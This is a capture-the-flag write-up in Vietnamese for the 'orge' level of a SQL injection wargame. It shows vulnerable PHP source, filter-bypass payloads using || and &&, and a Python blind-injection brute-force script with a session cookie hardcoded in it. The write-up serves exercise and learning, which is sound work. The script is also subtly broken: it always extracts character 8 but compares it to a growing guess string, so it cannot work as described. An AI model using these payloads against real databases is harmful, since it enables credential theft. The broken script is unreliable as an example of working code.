orge
===
### Description
- Source: 
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

### Solution
- Phân tích code: Ở bài này chương trình vẫn filter `or and` nhưng chúng ta có thể thay thế bằng `|| &&`. Để giải quyết được bài này thì đầu vào của mình là `pw` phải bằng `pw` của admin ở trong database. Chúng ta có thể in ra được `Hello admin` với payload `?pw='||id='admin'-- -` và thông qua đó ta có thể brute được length của pw với payload `?pw='||id=admin%26%26length(pw)=$$` thông qua intruder trong phần mềm burp.

#### Payload
- Bài này là blind sqlinjection vì vậy chúng ta brute pw bằng substring với đầu ra là `Hello admin`
- Code:
```py
import requests
import string

url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
header = {'Cookie':'PHPSESSID=l0ppfki89ui4onrms8661i27el'}
flag = ''


for i in range(1,256):
	for j in string.printable:
		temp = flag+j
		param = f"pw='||id='admin'%26%26substring(pw,8,1)='{temp}'-- -"
		print(param)
		r = requests.get(url=url,params=param,headers=header)
		if "Hello admin" in r.text:
			flag += j
			print(flag)
			break
	if len(flag)==8:
		exit(0)
```